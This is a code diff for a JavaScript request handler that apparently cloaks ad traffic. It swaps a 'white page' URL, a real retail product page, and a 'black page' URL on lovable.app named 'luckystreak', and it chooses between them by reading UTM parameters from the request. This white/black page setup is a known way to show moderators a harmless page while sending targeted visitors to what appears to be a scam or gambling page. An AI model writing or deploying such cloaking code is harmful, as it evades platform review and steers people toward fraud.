@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://yellowduckbabygifts.com.au/products/new-baby-girl-bunny-organic-hamper?pr_prod_strat=pinned&pr_rec_id=e289bfc69&pr_rec_pid=7461287788732&pr_ref_pid=2258748047411&pr_seq=uniform";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://habitt.com/products/zack-nest-of-tables-set?pr_prod_strat=jac&pr_rec_id=d7c049c05&pr_rec_pid=7862525821146&pr_ref_pid=7955469861082&pr_seq=uniform";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
